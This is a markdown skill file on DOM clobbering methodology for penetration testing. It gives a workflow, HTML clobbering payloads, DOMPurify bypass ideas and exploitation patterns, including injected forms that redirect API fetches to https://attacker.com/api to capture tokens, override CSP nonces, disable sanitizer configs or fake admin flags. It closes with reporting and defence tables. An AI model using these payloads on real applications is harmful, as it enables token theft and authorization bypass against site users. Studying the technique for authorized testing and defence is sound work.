---
name: offensive-dom-clobbering
description: "DOM Clobbering attack methodology — named element injection that overrides JavaScript globals (window.config, window.url, window.user), HTMLCollection-based clobbering for nested objects, document.* property override (document.cookie, document.URL), defaultView clobbering, and chaining DOM clobbering with sanitizer bypasses (DOMPurify, sanitize-html) to escape allowlists. Use against modern apps that load user-controlled HTML through 'safe' sanitizers — DOM clobbering bypasses many sanitizer allowlists because the injected HTML contains no `<script>` or `javascript:`."
---

# DOM Clobbering

A subtle XSS-adjacent technique: inject HTML elements with `id` or `name` attributes that match JavaScript variable names — the elements become accessible as global properties, overriding the variables the application code reads.

## Quick Workflow

1. Find a sink that renders user-controlled HTML (sanitized but allowing standard tags)
2. Identify a global JS variable the app reads (config, options, URL, user data)
3. Inject an element with `id` or `name` matching that variable
4. The application reads the clobbered DOM element instead of the intended JS value

---

## How DOM Clobbering Works

```html
<form id="config"></form>
```

```javascript
console.log(window.config);   // → <form id="config">
```

Named elements (with `id` or `name`) become properties of `window`. They're accessed by name — pre-existing JS variables of the same name are shadowed.

If the app does:

```javascript
const config = window.config || { apiUrl: '/api' };
fetch(config.apiUrl + '/me');
```

And the page contains attacker-injected `<form id="config"><input id="apiUrl" name="apiUrl" value="https://attacker.com/api"></form>`, then `config.apiUrl` resolves to the input element's value.

## Common Clobberable Properties

```javascript
// document.* properties
window.document.URL
window.document.cookie
window.document.location
window.document.body
window.document.head

// window.* properties
window.config
window.user
window.options
window.api
window.csrf
window.token

// Common app globals
window.app
window.routes
window.flags
```

## HTML Tag Reference for Clobbering

```html
<!-- Most basic -->
<a id="config">                          <!-- window.config = <a> element -->

<!-- Nested object access -->
<a id="config" name="apiUrl"></a>         <!-- window.config.apiUrl = "" -->

<!-- For .href -->
<a id="config" href="https://attacker"></a>   <!-- window.config.href = "https://attacker" -->

<!-- For deeper nesting via HTMLCollection -->
<form id="config">
  <input name="apiUrl" value="ATTACKER_URL">
</form>
<!-- window.config.apiUrl.value = "ATTACKER_URL" -->

<!-- Iframe -->
<iframe name="config" src="https://attacker.com"></iframe>
<!-- window.config = iframe's contentWindow -->
```

## DOMPurify Bypass via Clobbering

DOMPurify's default config allows most tags. It blocks `<script>`, event handlers, and javascript: URIs. But:

```html
<form id="getElementById">
  <input id="x">
</form>
```

If the app does `document.getElementById('x')`, DOM clobbering breaks the document method:

```javascript
document.getElementById('x')   // Would return the <input>
// But if document.getElementById is clobbered by an element named "getElementById",
// the call no longer goes to the function — calls fail or behave unexpectedly
```

This can disrupt sanitizer logic that uses these methods, allowing later injections to slip through.

## Practical Exploitation Patterns

### Override CSP Nonce Source

```javascript
// Vulnerable
script.nonce = window.config.cspNonce;
```

If `cspNonce` source is clobberable, attacker controls the script's CSP nonce — any subsequent injected script with that nonce executes despite CSP.

### Hijack Endpoint URLs

```javascript
fetch(window.api.users + '/me')
```

Clobber `window.api.users` → fetch points to attacker. Tokens / data exfiltrated.

### Override Sanitizer Configuration

```javascript
DOMPurify.sanitize(input, window.sanitizerConfig)
```

If `window.sanitizerConfig` is clobberable, attacker disables the sanitizer.

### Bypass Authorization Checks

```javascript
if (window.user.isAdmin) { /* show admin UI */ }
```

Clobber `window.user` to a form with `isAdmin="true"`-equivalent attribute.

## Tooling

```bash
# DOM Clobbering Wiki (community-maintained reference)
# https://domclob.xyz/domc_wiki/

# domclob — testing toolkit
git clone https://github.com/wisec/dom-clobbering
```

## Detection in Source

```bash
# Search for window.* variable accesses that could be clobbered
grep -E "window\\.\\w+\\.\\w+" app.js

# Look for assumes-undefined-or-config pattern
grep -E "= window\\.\\w+ \\|\\|" app.js
```

For each match, check whether user-controlled HTML can land in the page with elements named accordingly.

## Engagement Cheatsheet

```javascript
// 1. Find sanitizer-allowed HTML sinks
// - Comments, blog posts, profile bios, support tickets

// 2. Identify globals the app reads
// - Search "window." in JS bundle

// 3. For each candidate global:
//    Submit HTML with id/name matching the global
//    <form id="config"><input name="apiUrl" value="https://attacker.com/api"></form>

// 4. Verify clobbering succeeded
//    DevTools → Console → check window.config

// 5. Trigger app code path that reads the global
//    Reload page, click button, etc.

// 6. Confirm impact (data exfil, redirect, auth bypass)
```

## Reporting

- Vulnerable sink (where HTML is allowed)
- Global JavaScript variable being clobbered
- Application code path reading the global
- Exact HTML payload
- Impact (data exfil, redirect, etc.)
- Fix recommendation: avoid reading globals via property names that match potential element IDs; use Object.defineProperty to lock; sanitize element id/name attributes

## Defense Awareness

| Defense | Effectiveness |
|---|---|
| Strict CSP (no inline + nonce) | Helps, but DOM clobbering doesn't always need new script |
| Sanitizer that strips id/name | Effective, but overzealous (breaks legitimate UI) |
| Use Symbol-keyed properties for app globals | Effective — symbols can't be clobbered |
| Use Object.freeze on globals | Helps for primitives |
| Use IIFE/closure-scoped state | Effective when globals can be avoided |

---

## Key References

- domclob.xyz — DOM Clobbering Wiki (Heyes et al)
- "DOM Clobbering" by Mario Heiderich
- "Bypassing DOMPurify with mXSS and DOM Clobbering" research
- HTML Living Standard — named property access on Window
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/dom-clobbering.md
